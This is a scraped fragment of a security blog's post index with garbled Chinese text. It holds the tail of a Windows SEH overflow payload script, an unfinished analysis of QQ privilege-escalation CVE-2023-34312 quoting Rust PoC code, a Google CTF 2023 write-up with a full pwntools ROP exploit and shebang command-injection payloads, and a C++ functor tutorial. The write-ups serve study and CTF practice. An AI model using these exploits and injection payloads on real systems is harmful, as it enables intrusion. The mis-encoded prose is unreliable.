1234567891011121314151617from ae64 import AE64payload = b&quot;&quot;shellcode = b&quot;&quot;offset = b&quot;A&quot;*(0x11c-len(shellcode)-16) #0x1ctest_func = b&quot;\\xc4\\x16\\x40\\x00&quot; #004016C4NSEH = b&quot;\\xeb\\x06\\x90\\x90&quot; #asm(&quot;jmp 6;nop;nop&quot;)gadget = b&quot;\\xee\\x19\\x40\\x00&quot; #004019EE 00402537 004017EEself_gadget = b&quot;\\x89\\xE0\\x05\\x14\\x06\\x00\\x00\\xFF\\xE0&quot; # mov eax, esp # sub eax, 0x608 # jmp eaxpayload = b&quot;\\xaa&quot;*16+shellcode+offset+NSEH+gadget+self_gadgetwith open(&quot;password.txt&quot;,&quot;wb&quot;) as f: f.write(payload)","categories":[{"name":"notes","slug":"notes","permalink":"https://joe1sn.eu.org/categories/notes/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://joe1sn.eu.org/tags/windows/"},{"name":"pwn","slug":"pwn","permalink":"https://joe1sn.eu.org/tags/pwn/"}]},{"title":"ã€æ¼æ´å¤ç°ã€‘CVE-2023-34312åˆ†æ","slug":"qq-evasion","date":"2023-07-03T12:13:39.000Z","updated":"2023-07-18T01:32:15.629Z","comments":true,"path":"2023/07/03/qq-evasion/","link":"","permalink":"https://joe1sn.eu.org/2023/07/03/qq-evasion/","excerpt":"å…³äºQQææƒæ¼æ´CVE-2023-34312çš„åˆ†æ ï¼ï¼æœªå®Œå¾…ç»­ï¼ï¼","text":"å…³äºQQææƒæ¼æ´CVE-2023-34312çš„åˆ†æ ï¼ï¼æœªå®Œå¾…ç»­ï¼ï¼ PoCåˆ†æ PoCåœ°å€ï¼šhttps://github.com/vi3t1/qq-tim-elevationï¼Œç”¨rustå†™çš„æŒ‰ç…§æ•™ç¨‹ç¼–è¯‘å¥½äº†å°±å¯ä»¥ç›´æ¥æ‰“äº† ç”±äºæ²¡æœ‰å¼€å¯ASLRä¿æŠ¤æ‰€ä»¥å¾ˆç¨³ æ¥ç€æ˜¯åˆ†æä¸€ä¸‹PoC è§¦å‘ è§¦å‘æ–¹å¼æ˜¯.\\QQProtect .\\evil.dllï¼ŒåŒæ—¶å¿…é¡»ä¿æŒtinyxml.dllåœ¨åŒä¸€ç›®å½•ä¸‹ï¼Œè¿™é‡Œç”¨QQ9.7.7ä¸¾ä¾‹å­ã€‚ é¦–å…ˆæ˜¯GetCommandLineWè·å¾—å¯åŠ¨å‚æ•°ï¼Œæ¥ç€åˆ¤æ–­ç½®å¦å­˜åœ¨ä¸‹åˆ—å…³é”®å‚æ•°ï¼Œç„¶åä¸å­˜åœ¨å…³é”®å‚æ•°ç›´æ¥åˆ°äº†StartAddress ä½¿ç”¨QQProtectEngine.dllä¸­çš„RunQQProtectï¼Œè®¾ç½®å›è°ƒå‡½æ•°sub_40C950 å›è°ƒå‡½æ•°ä¸­çš„a2æŒ‡é’ˆå¯ä»¥å°†ä»»ä½•åœ°å€çš„å€¼è®¾ç½®ä¸ºå‚æ•°åˆ†ææ—¶çš„å‚æ•°ä¸ªæ•°å€¼ï¼Œä¹Ÿå°±æ˜¯ 1ã€‚ é‚£ä¹ˆç°åœ¨æˆ‘ä»¬å°±æœ‰äº†å°†ä»»æ„åœ°å€å†™ä¸º1çš„èƒ½åŠ›ï¼Œæ°å¥½QQProtect.exeæ²¡æœ‰å¼€å¯ASLRä¿æŠ¤ï¼Œè‹¥å¼€å¯çš„è¯ä¸‹å›¾åº”è¯¥å­˜åœ¨IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE PoC å’Œä¸Šæ–‡ä¸­ç»“åˆèµ·æ¥ï¼Œåœ¨QQProtectä¸­å¯¼å…¥äº†tinyxml.dllï¼Œæ‰€ä»¥å¯ä»¥ä¿®æ”¹è¿™ä¸ªdllçš„å†…å®¹æ¥æ‰§è¡Œæ”»å‡»ã€‚ PoCé¦–å…ˆè·å–äº†evil.dllçš„è·¯å¾„ï¼Œ 123let evil_dllpath: String = std::env::args().nth(1).unwrap();let evil_dllpath: std::path::PathBuf = std::path::Path::new(&amp;evil_dllpath).canonicalize().unwrap();println!(&quot;evil dll: &#123;&#125;&quot;, evil_dllpath.display()); æ¥ç€æ‰“å¼€æœåŠ¡è·å¾—QQProtectEngine.dllçš„åŸºåœ°å€ï¼ˆå› ä¸ºä»–å¼€å¯äº†ASLRä¿æŠ¤ï¼‰ã€‚ åœ¨PoCä¸­æ‰“å¼€äº†Windowsçš„QPCoreæœåŠ¡ç„¶åè·å–é…ç½®ä¿¡æ¯ï¼Œä»é…ç½®ä¿¡æ¯ä¸­æå–å‡ºqqprotect.exeå’ŒQQProtectEngine.dllçš„è·¯å¾„ã€‚ ç”±äºLoadLibraryExWä¸­ä½¿ç”¨äº†DONT_RESOLVE_DLL_REFERENCESæ‰€ä»¥ä¸ä¼šè°ƒç”¨DLLMainï¼Œè‹¥å‡½æ•°æˆåŠŸï¼Œåˆ™è¿”å›å€¼æ˜¯å·²åŠ è½½æ¨¡å—çš„å¥æŸ„ï¼Œä»å¥æŸ„çš„ç¬¬ä¸€ä¸ªå€¼æå–å‡ºåŠ è½½çš„åœ°å€ã€‚æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œæ˜¯é¦–å…ˆåŠ è½½tinyxml.dllï¼Œæ‰€ä»¥åŠ è½½çš„QQProtectEngine.dllçš„åœ°å€åœ¨è¿™é‡ŒåŒä¸€æ ·é€‚ç”¨ï¼Œè¿™æ ·å°±è·å¾—äº†QQProtectEngine.dllçš„åŸºåœ°å€ã€‚ 123456789101112131415fn get_qqprotectengine_dllbase() -&gt; u32 &#123; let manager = ServiceManager::local_computer(None::&lt;&amp;str&gt;, ServiceManagerAccess::ENUMERATE_SERVICE).unwrap(); let service = manager.open_service(&quot;QPCore&quot;, ServiceAccess::QUERY_CONFIG).unwrap(); let service_config = service.query_config().unwrap(); let qqprotect_exe = windows_args::ArgsOs::parse_cmd(service_config.executable_path.as_os_str()).next().unwrap(); let qqprotectengine_dll = std::path::Path::new(&amp;qqprotect_exe).parent().unwrap().join(&quot;QQProtectEngine.dll&quot;); unsafe &#123; let h = LoadLibraryExW(PCWSTR(HSTRING::from(qqprotectengine_dll.as_path()).as_ptr()), HANDLE::default(), DONT_RESOLVE_DLL_REFERENCES).unwrap(); let base = h.0 as u32; FreeLibrary(h); return base; &#125;&#125; åˆ›å»ºIPCè¿›ç¨‹é—´é€šè®¯ å¦‚ä½•æ‰¾åˆ°IPCé€šè®¯ï¼Œå¯ä»¥åœ¨https://learn.microsoft.com/en-us/sysinternals/downloads/pipelistå®‰è£…`pipelist`æŸ¥çœ‹æ‰€æœ‰çš„å‘½åç®¡é“é€šè®¯ é‚£ä¹ˆåœ¨QQProtect.exeä¸€å®šä¼šæœ‰ä¸€ä¸ªè¿æ¥å‘½åç®¡é“çš„åœ°æ–¹ï¼Œåœ¨QQProtectEnginee.dllä¸­ä½¿ç”¨ æ‰¾åˆ°å¯¹åº”çš„ç®¡é“å‘½å å’Œ ï¼ˆå›è°ƒåˆ†æéº»äº†ï¼‰ä¹‹åä¼šè¿›å…¥QSection.dllä¸­çš„å‡½æ•°ï¼Œå…·ä½“é€†å‘å¯ä»¥çœ‹Bæˆ˜å¤§ä½¬çš„è§†é¢‘ï¼šhttps://www.bilibili.com/video/BV1wm4y1E7TL å¾ˆåƒä¸€ä¸ªç»“æ„ä½“ã€‚åŠ è½½äº†QPSectionåè°ƒç”¨äº†6å·å¯¼å‡ºå‡½æ•°ï¼Œä¹‹åè¿˜éœ€è¦å¯¹ç»“æ„ä½“è¿›è¡Œé€†å‘","categories":[],"tags":[]},{"title":"ã€CTFã€‘2023 Google CTF WriteUpä¸å¤ç°","slug":"googleCTF-wp","date":"2023-06-26T15:44:49.000Z","updated":"2023-06-27T12:28:50.376Z","comments":true,"path":"2023/06/26/googleCTF-wp/","link":"","permalink":"https://joe1sn.eu.org/2023/06/26/googleCTF-wp/","excerpt":"ç«¯åˆèŠ‚æ‰“çš„æ¯”èµ›ï¼Œäº‹æƒ…æ¯”è¾ƒå¤šæ²¡æ€ä¹ˆçœ‹é¢˜ï¼ŒæŒ‡å¯¼å­¦å¼Ÿåšäº†ä¸‹ï¼Œè¿™é‡Œæ¥ä¸ªå¤ç›˜ã€‚ å¼€å§‹CTFçš„å¤å¥ä¹‹è·¯å§ã€‚","text":"ç«¯åˆèŠ‚æ‰“çš„æ¯”èµ›ï¼Œäº‹æƒ…æ¯”è¾ƒå¤šæ²¡æ€ä¹ˆçœ‹é¢˜ï¼ŒæŒ‡å¯¼å­¦å¼Ÿåšäº†ä¸‹ï¼Œè¿™é‡Œæ¥ä¸ªå¤ç›˜ã€‚ å¼€å§‹CTFçš„å¤å¥ä¹‹è·¯å§ã€‚ Pwn WRITE-FLAG-WHERE æœ€ç®€å•çš„ä¸€é“pwnï¼Œæ²¡æœ‰å¼€ASLRä¿æŠ¤ã€‚å½“æ—¶æˆ‘çš„æœºå™¨è·‘ä¸èµ·æ¥ï¼Œå­¦å¼Ÿçš„èƒ½è·‘ï¼Œå’Œä»–ä¸€èµ·åˆ†æã€‚ ç¨‹åºçš„ä¸»é€»è¾‘æ˜¯è¯»å–/proc/self/mapsæ¥è¯»å–å­˜åœ¨çš„å†…å­˜ï¼ˆgdbä¸­çš„vmmapå°±æ˜¯è¿™æ ·å®ç°çš„ï¼‰ï¼Œç„¶åæŠŠ flag è¯»å–åˆ°ä¸€ä¸ªå…¨å±€å˜é‡ä¸­ï¼Œæœ€åæˆ‘ä»¬å¯ä»¥åœ¨ä»»æ„ä¸€ä¸ªåœ°å€å†™å…¥ä»»æ„é•¿åº¦ï¼ˆ&lt;0x7fï¼‰çš„flagä¸­çš„å­—ç¬¦ä¸²ã€‚ å½“æ—¶æˆ‘ä»¬æ˜¯åœ¨archä¸Šåšçš„ï¼Œä½¿ç”¨gdbèƒ½çœ‹åˆ°è¾“å‡ºï¼Œç„¶åå°è¯•å°†flagè¦†ç›–å†…å­˜ä¸­çš„æç¤ºè¯­å¥ é‚£ä¹ˆåœ°å€å°±æ˜¯ *$rebase(0x21E0)ï¼Œå°è¯•è¿œç¨‹ å¾—åˆ°flag CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9} WRITE-FLAG-WHERE 2 å½“æ—¶ç¦»åšå‡ºæ¥å·®äº†äº¿ç‚¹ç‚¹ã€‚ ä¿æŠ¤æ²¡å˜ï¼Œä½†æ˜¯åˆ é™¤äº†ä¹‹å‰çš„å­—ç¬¦ä¸²ä¿®æ”¹ç‚¹ã€‚åæ¥æˆ‘çœ‹åˆ°äº†æœ‰ä¸€æ®µæ— å…³çš„ä»£ç æ®µ åæ¥æƒ³è¿™é“é¢˜å¿«æƒ³é­”æ€”äº† ã€æœªè§£å‡ºã€‘ä½¿ç”¨sscanfè¦†ç›– æŒºç–¯ç‹‚çš„ä¸€ä¸ªæƒ³æ³•ï¼Œç”±äºæ­»å¾ªç¯å†…ä¸å­˜åœ¨è¾“å…¥ï¼Œä½†æ˜¯sscanfä¼šæ ¹æ®ä½ çš„è¾“å…¥å»åŒ¹é…ï¼Œç„¶åæˆ‘ä»¬åˆçŸ¥é“flagæ˜¯CTF&#123;xxxx&#125;ï¼Œæ‰€ä»¥å¯ä»¥è¦†ç›–0x%llx %uçš„ç¬¬ä¸€ä¸ªï¼Œç±»ä¼¼äºï¼š é€æ­¥ç¼©å°åœ°å€çˆ†ç ´å¾—åˆ°flagï¼Œä½†æ˜¯è€ƒè™‘åˆ°å·¥ä½œé‡è€Œä¸”å¤ªä¹…æ²¡åšCTFå¯¼è‡´pwntoolsçš„ä¸ç†Ÿæ‚‰æ²¡æœ‰èƒ½æˆåŠŸ ã€å·®ä¸€ç‚¹ã€‘å¯è§†åŒ–shellcode å’Œä¸Šé¢çš„æ€è·¯å·®ä¸å¤šï¼Œåªä¸è¿‡æ˜¯åˆ©ç”¨äº†Tçš„ASCIIä¸º0x54ï¼Œè€Œ0x54çš„æ±‡ç¼–ç æ˜¯push rspï¼Œé‚£ä¹ˆä¸€ç›´å†™å…¥Tï¼Œè®©æœ€åçš„é€€å‡ºåˆ’å…¥é‚£æ®µä¸ç›¸å…³çš„ä»£ç æ®µ 1234567891011def nop2(addr,lenth): r.sendline(b&quot;0x%x %d&quot; % (addr+base,lenth)) sleep(0.1)nop2(0x20d5,50)for i in range(10): nop2(0x1443-i,2)sleep(0.1)r.sendline(b&quot;0x1234 111111&quot;) æœ€åå¾—åˆ°flag CTF{impr355iv3_6ut_can_y0u_s01v3_cha113ng3_3?} æ³¨æ„ï¼šç”±äºç½‘ç»œå»¶æ—¶æœ€åçš„flagä¸å¼€ä»£ç†å¯¼è‡´æ²¡æœ‰æ”¶åˆ°â€¦ WRITE-FLAG-WHERE 3 ä¸Šä¸€é“é¢˜ç›´æ¥å¯¼è‡´å¿ƒæ€çˆ†ç‚¸ï¼Œè¿™é“é¢˜æ²¡æ€ä¹ˆçœ‹ã€‚ä¸è¿‡çœ‹ä¸Šå»é™åˆ¶äº†æˆ‘ä»¬èƒ½ä¿®æ”¹çš„åœ°å€èŒƒå›´ ä¸èƒ½ æ˜¯mainå‡½æ•°Â±0x5000çš„ä½ç½®ï¼Œå¯¼è‡´ä¹‹å‰çš„expå¤±æ•ˆã€‚ ä¸è¿‡æœ¬åœ°patchedè¿‡çš„ç‰ˆæœ¬æˆåŠŸè°ƒç”¨äº†alarm é‚£ä¹ˆè¯•è¯•ä¿®æ”¹libcä¸­çš„æŠ¥é”™ä¸ºflagï¼Œä½†æ˜¯ä¸è¡Œ ä¸è¿‡æ€è·¯ä¹Ÿæ˜¯å¾ˆæ¥è¿‘çš„äº†ï¼Œåœ¨å®˜æ–¹çš„expä¸­ä½¿ç”¨äº†&#125;ï¼Œä½œä¸ºjnpæ¥è¿›è¡Œçˆ†ç ´ã€‚å…¶ä»–ä¹Ÿæ˜¯ä½¿ç”¨äº†ä¸€ä¸‹gadgetï¼Œåˆ©ç”¨jnp 0x48å®ç°ROPçš„è·³è½¬ 1234r3tr0@pwnmachine:~$ rasm2 -ax86 -b64 -d 0x4354467b4354 push r12jnp 0x48push rsp ä½¿ç”¨2ä¸­çš„æ€è·¯è¦†å†™libcä¸­çš„exit ç”±äºè¾“å…¥ä½äºæ ˆä¸Šä½¿ç”¨ï¼Œè¾“å…¥ç»„åˆçš„ROPé“¾ï¼Œç”±äºlibcä¸­çš„exitå·²ç»è¢«è¦†å†™ï¼Œæ‰€ä»¥ç¨‹åºä¼šè¿”å›retï¼Œä»è€Œè§¦å‘ROPé“¾ï¼Œæœ€åå®ç°writeå†™å‡ºflag è¿™é‡Œä½¿ç”¨r3kpigçš„expæ‰“ä¸€ä¸‹ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *context.log_level=&#x27;debug&#x27;context.arch=&#x27;amd64&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]# p=process(&#x27;./main&#x27;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)# gdb.attach(p)# p.interactive()# exit(1)sh=&#x27;&#x27;&#x27;b *0x555555555478b *0x555555555491b exit&#x27;&#x27;&#x27;# p = process(&quot;./chal&quot;)# p = gdb.debug(&quot;./chal&quot;,sh,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)p = remote(&quot;wfw3.2023.ctfcompetition.com&quot;,1337)ru = lambda a: p.readuntil(a)r = lambda n: p.read(n)sla = lambda a,b: p.sendlineafter(a,b)sa = lambda a,b: p.sendafter(a,b)sl = lambda a: p.sendline(a)s = lambda a: p.send(a)def ch(addr,l): target = addr pay = hex(target).encode()+b&quot; &quot;+str(l).encode() p.send(pay.ljust(0x40,b&#x27;\\0&#x27;))def end(l): p.send(flat(l).ljust(0x40,b&#x27;\\xff&#x27;)) p.read()def nop(addr,l): if l%2!=0: l=l-1 ch(addr+l-1,1) for x in range(0,l,2): ch(addr+x,2)ru(b&quot; expire\\n&quot;)PIE = int(p.readuntil(b&quot;-&quot;)[:-1],0x10)info(hex(PIE))for x in range(7): ru(b&quot;\\n&quot;)base = int(p.readuntil(b&quot;-&quot;)[:-1],0x10)info(hex(base))ru(b&quot;\\n\\n&quot;)ch(0x455f0+0x1b+base,1)ch(0x455f0+0x17+base,1)ch(0x455f0+0x2b-3+base,1)ch(0x455f0+0x2b-2+base,2)ch(0x455f0+0x1f+base,1)ch(0x455f0+0x4+base,1)ch(0x455f0+0x26+base,1)rdi = 0x000000000002a3e5+basebprintf = 0x555555555090-0x555555554000+PIEflag = 0x5555555590A0-0x555555554000+PIErsi = 0x000000000002be51+baseend([rdi,1337,rsi,flag,bprintf,])p.interactive() å¾—åˆ°flag CTF{y0ur_3xpl0itati0n_p0w3r_1s_0v3r_9000!!} STORYGEN ä¸‹è½½ä¸‹æ¥æ˜¯pythonæ–‡ä»¶ã€‚ å‘ç°ä½¿ç”¨äº†os.system(&quot;/tmp/script.sh&quot;)ï¼Œé‚£ä¹ˆé¡ºç€é€»è¾‘å»åˆ†æï¼š 12345678910111213141516171819202122232425262728293031#@NAME&#x27;s storyNAME=&#x27;@NAME&#x27;WHERE=&#x27;@WHERE&#x27;echo &quot;$NAME came from $WHERE. They always liked living there.&quot;echo &quot;They had 3 pets:&quot;types[0]=&quot;dog&quot;types[1]=&quot;cat&quot;types[2]=&quot;fish&quot;names[0]=&quot;Bella&quot;names[1]=&quot;Max&quot;names[2]=&quot;Luna&quot;for i in 1 2 3do size1=$&#123;#types[@]&#125; index1=$(($RANDOM % $size1)) size2=$&#123;#names[@]&#125; index2=$(($RANDOM % $size2)) echo &quot;- a $&#123;types[$index1]&#125; named $&#123;names[$index2]&#125;&quot;doneechoecho &quot;Well, I&#x27;m not a good writer, you can write the rest... Hope this is a good starting point!&quot;echo &quot;If not, try running the script again.&quot; ç„¶åè¾“å…¥æ›¿æ¢è¿™æ®µè„šæœ¬ open(&quot;/tmp/script.sh&quot;, &quot;w&quot;).write(STORY.replace(&quot;@NAME&quot;, name).replace(&quot;@WHERE&quot;, where).strip()) ä¸è¿‡å­˜åœ¨å°WAF 12def sanitize(s): return s.replace(&quot;&#x27;&quot;, &#x27;&#x27;).replace(&quot;\\n&quot;, &quot;&quot;) é¦–è¦æ€è·¯è‚¯å®šæ˜¯å‘½ä»¤æ³¨å…¥ï¼Œè€Œä¸”åœ¨é¦–è¡Œçš„#@NAME's storyè‡ªå¸¦äº†ä¸€ä¸ª'ï¼Œå¦‚æœä½ å¯¹shellè„šæœ¬æ¯”è¾ƒäº†è§£çš„è¯ï¼Œä¼šçŸ¥é“å¾€å¾€æ˜¯ä»¥#!/bin/bashå¼€å§‹çš„ï¼Œå°è¯•ä¸€ä¸‹ æˆåŠŸè°ƒç”¨äº†/bin/bashã€‚èµ›åçœ‹wpå‘ç°è¿™ä¸ªæ˜¯Shebangï¼ˆä¹Ÿç§°ä¸ºHashbangï¼‰ï¼Œæ˜¯ä¸€ç§åœ¨Unixå’Œç±»Unixç³»ç»Ÿä¸­ç”¨äºæŒ‡å®šè„šæœ¬è§£é‡Šå™¨çš„çº¦å®šï¼Œå®ƒæ˜¯é€šè¿‡åœ¨è„šæœ¬æ–‡ä»¶çš„ç¬¬ä¸€è¡Œä»¥ç‰¹å®šæ ¼å¼æŒ‡å®šè§£é‡Šå™¨çš„è·¯å¾„æ¥å®ç°çš„ï¼Œå¯ä»¥åˆ©ç”¨è¿™ç§æ–¹å¼ç›´æ¥./hello.pyï¼Œæ¯”å¦‚ï¼š 12#!/usr/bin/python3print(&quot;hello&quot;) é‚£ä¹ˆå¼€å§‹æ„é€ expï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å°½é‡ä½¿ç”¨\\x00æˆªæ–­ å®˜æ–¹wpä¸­ä»‹ç»äº†ä¸€ç§æŠ€å·§ï¼š#!/bin/cat&lt;ç©ºæ ¼&gt;çš„æ—¶å€™ä¼šè¯»å–è‡ªèº«è„šæœ¬çš„å†…å®¹ï¼Œé¦–å…ˆä½¿ç”¨ls -alæŸ¥çœ‹ç›®å½•ï¼Œæœ€åæ’æŸ¥åˆ°æ ¹ç›®å½• '!/usr/bin/env -S ls -al /\\x00' å°è¯•è¯»å–flagï¼Œå‡ºç°æç¤º !/usr/bin/env -S cat /flag\\x00 å¾—åˆ°æç¤ºï¼Œæœ€åä½¿ç”¨payloadå¾—åˆ°flag !/usr/bin/env -S sh -c &quot;/get_flag Give flag please&quot;\\x00 CTF{Sh3b4ng_1nj3cti0n_ftw} UBF","categories":[{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://joe1sn.eu.org/tags/CTF/"},{"name":"writeup","slug":"writeup","permalink":"https://joe1sn.eu.org/tags/writeup/"}]},{"title":"ã€å…æ€ã€‘C++å‡½æ•°è¿›åŒ–","slug":"cpp-function","date":"2023-06-26T00:10:22.000Z","updated":"2023-06-26T15:41:34.611Z","comments":true,"path":"2023/06/26/cpp-function/","link":"","permalink":"https://joe1sn.eu.org/2023/06/26/cpp-function/","excerpt":"C++çš„å‡½æ•°è¿›åŒ–å°ç»“","text":"C++çš„å‡½æ•°è¿›åŒ–å°ç»“ å‡½æ•° æœ‰è¿™æ ·ä¸€ä¸ªé—®é¢˜ 1234567#include &lt;iostream&gt;int main()&#123; int IntArray = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //ç»Ÿè®¡å¤§äº20çš„æ•°å­— return 0;&#125; é‚£ä¹ˆå¾ˆè‡ªç„¶çš„ç»™å‡ºè§£æ³• 123456789101112131415161718#include &lt;iostream&gt;int CountMatch(int* start, int* end)&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (*start &gt; 20) sum++; &#125; return sum;&#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //ç»Ÿè®¡å¤§äº20çš„æ•°å­— std::cout&lt;&lt;&quot;Matches: &quot;&lt;&lt;CountMatch(IntArray,IntArray+20)&lt;&lt;std::endl; return 0;&#125; å‡½æ•°æŒ‡é’ˆ è¿™ä¸ªæ—¶å€™çš„éœ€è¦æ»¡è¶³ ç»Ÿè®¡å¤§äº10çš„æ•°å­— æˆ–è€… ç»Ÿè®¡å°äº35çš„æ•°å­—ï¼Œé‚£ä¹ˆå¯ä»¥å°†*start &gt; 20è¿™ä¸€æ®µåŒ…è£…ä¸€ä¸‹ 123456789101112131415161718192021222324#include &lt;iostream&gt;int CountMatch(int* start, int* end, bool(*ConditionFunc)(const int &amp;))&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum;&#125;bool bGreat20(const int &amp;num)&#123; return num &gt; 20; &#125;bool bGreat10(const int &amp;num)&#123; return num &gt; 10; &#125;bool bLess35(const int &amp;num)&#123; return num &lt; 35; &#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //ç»Ÿè®¡å¤§äº20çš„æ•°å­— std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat20 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 10 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat10 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bLess35 )&lt;&lt;std::endl; return 0;&#125; å›¾ç‰‡ä¸Šçš„ä»£ç æœ‰ç‚¹å°é—®é¢˜ åœ¨cè¯­è¨€ä¸­å¯ä»¥è¿™æ ·å†™ï¼Œè™½ç„¶ç¼–è¯‘ä¼šæœ‰è­¦å‘Šï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥ç”Ÿæˆã€‚ 1234567891011121314151617181920212223#include &lt;stdio.h&gt;int CountMatch(int* start, int* end, void *function_pointer(int))&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (function_pointer(*start)) sum++; &#125; return sum;&#125;int Pointer(int start)&#123; printf(&quot;Happy\\n&quot;); return 1;&#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; //ç»Ÿè®¡å¤§äº20çš„æ•°å­— printf(&quot;Matches: %d\\n&quot;,CountMatch(IntArray,IntArray+20, Pointer)); return 0;&#125; åœ¨cä¸­ä¼´éšç€æŒ‡é’ˆçš„å¼•ç”¨*på’Œè§£å¼•ç”¨&amp;pï¼ŒCå¯¹æŒ‡é’ˆçš„ç±»å‹å®‰å…¨æ€§è¿›è¡Œäº†æ›´ä¸¥æ ¼çš„é™åˆ¶ã€‚C++ä¸­çš„æŒ‡é’ˆç±»å‹å¿…é¡»ä¸æ‰€æŒ‡å‘çš„å¯¹è±¡ç±»å‹åŒ¹é…ï¼Œä¸å…è®¸è¿›è¡Œéšå¼ç±»å‹è½¬æ¢ã€‚è¿™å¯ä»¥å¸®åŠ©å‡å°‘æ½œåœ¨çš„ç±»å‹é”™è¯¯å’Œç¼–ç¨‹é”™è¯¯ã€‚ å‡½æ•°æ¨¡æ¿ ä¸Šé¢çš„å‡½æ•°åªèƒ½æ”¯æŒintï¼Œä½¿ç”¨å‡½æ•°æ¨¡æ¿èƒ½è®©ä»–æ”¯æŒæ›´å¤šç±»å‹ 123456789101112131415161718192021222324252627#include &lt;iostream&gt; template &lt;typename T&gt; int CountMatch(T* start, T* end, bool(*ConditionFunc)(const T &amp;))&#123; int sum = 0; for (; start &lt; end ; start++) &#123; if (ConditionFunc(*start)) sum++; &#125; return sum; &#125;bool bGreat20(const int &amp;num)&#123; return num &gt; 20; &#125;bool bGreat10(const int &amp;num)&#123; return num &gt; 10; &#125;bool bLess35(const int &amp;num)&#123; return num &lt; 35; &#125;bool bTiny(const std::string &amp;val)&#123; return val.size() &lt;= 3; &#125;int main()&#123; int IntArray[] = &#123; 12, 13, 35, 16, 6, 5, 5, 12, 4, 13, 38, 35, 37, 33, 35, 15, 36, 14, 13, 12 &#125;; std::string StrArray[] = &#123;&quot;Hello&quot;,&quot;world&quot;,&quot;This&quot;,&quot;is&quot;,&quot;a&quot;,&quot;test&quot;&#125;; //ç»Ÿè®¡å¤§äº20çš„æ•°å­— std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat20 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 10 Matches: &quot;&lt;&lt;CountMatch( IntArray, IntArray+20, bGreat10 )&lt;&lt;std::endl; std::cout&lt;&lt;&quot;Greater than 20 Matches: &quot;&lt;&lt;CountMatch( StrArray, StrArray+6, bTiny )&lt;&lt;std::endl; return 0;&#125; ä»¿å‡½æ•° åœ¨æ¡ä»¶ä¸­å¦‚æœéœ€è¦å¤„ç†ç”¨æˆ·ä¼ å…¥çš„æ•°å­—æ€ä¹ˆåŠ ä»¿å‡½æ•°ï¼ˆFunctorï¼‰æ˜¯C++ä¸­çš„ä¸€ä¸ªæ¦‚å¿µï¼ŒæŒ‡çš„æ˜¯å¯ä»¥åƒå‡½æ•°ä¸€æ ·ä½¿ç”¨çš„å¯¹è±¡ã€‚å®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªç±»æˆ–ç»“æ„ä½“ï¼Œé‡è½½äº†å‡½æ•°è°ƒç”¨è¿ç®—ç¬¦ operator()ï¼Œä½¿å¾—å¯¹è±¡å¯ä»¥åƒå‡½æ•°ä¸€æ ·è¿›è¡Œè°ƒç”¨æ“ä½œã€‚ chatGPTç»™äº†æˆ‘è¿™æ ·ä¸€ä¸ªä¾‹å­ 1234567891011121314151617181920212223#include &lt;iostream&gt;// å®šä¹‰ä¸€ä¸ªä»¿å‡½æ•°ç±»class AddFunctor &#123;public: int operator()(int a, int b) &#123; return a + b; &#125;&#125;;int main() &#123; // åˆ›å»ºä¸€ä¸ªä»¿å‡½æ•°å¯¹è±¡ AddFunctor add; // ä½¿ç”¨ä»¿å‡½æ•°å¯¹è±¡è¿›è¡Œè°ƒç”¨ int result = add(3, 4); // è¾“å‡ºç»“æœ std::cout &lt;&lt; &quot;Result: &quot; &lt;&lt; result &lt;&lt; std::endl; return 0;&#125; åœ¨è¿™é‡Œå¯ä»¥è¿™æ ·å†™ 12345678template &lt;typename T&gt;struct Greater&#123; T mVal; //æŒæœ‰çš„çŠ¶æ€ explicit Greater(T value): mVal(value)&#123;&#125; bool operator()(const T &amp;val) const &#123; return val&gt;mVal; &#125;&#125;; explicitï¼šé€šè¿‡åœ¨å•å‚æ•°æ„é€ å‡½æ•°å‰æ·»åŠ  explicit å…³é”®å­—ï¼Œå¯ä»¥é˜²æ­¢ç¼–è¯‘å™¨åœ¨éœ€è¦è¿›è¡Œç±»å‹è½¬æ¢çš„æƒ…å†µä¸‹è‡ªåŠ¨è°ƒç”¨è¯¥æ„é€ å‡½æ•°ã€‚ operatorï¼šä»¿å‡½æ•°çš„å®ç°ï¼Œä½¿å¾—å¯¹è±¡å¯ä»¥åƒå‡½æ•°ä¸€æ ·è¿›è¡Œè°ƒç”¨æ“ä½œã€‚ 